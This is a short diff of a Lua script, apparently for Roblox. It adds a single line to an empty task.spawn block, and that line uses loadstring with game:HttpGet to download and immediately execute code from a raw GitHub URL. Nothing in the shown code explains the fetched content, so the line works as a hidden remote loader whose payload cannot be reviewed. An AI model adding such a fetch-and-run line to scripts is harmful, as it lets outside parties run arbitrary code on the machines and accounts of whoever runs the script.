@@ -1722,6 +1722,7 @@ game:GetService("RunService").RenderStepped:Connect(function()
     end
 end)
 task.spawn(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OverlordCryx/X_/refs/heads/main/SLS/pop"))()
 end)
 task.spawn(function()
 local Players = game:GetService("Players")
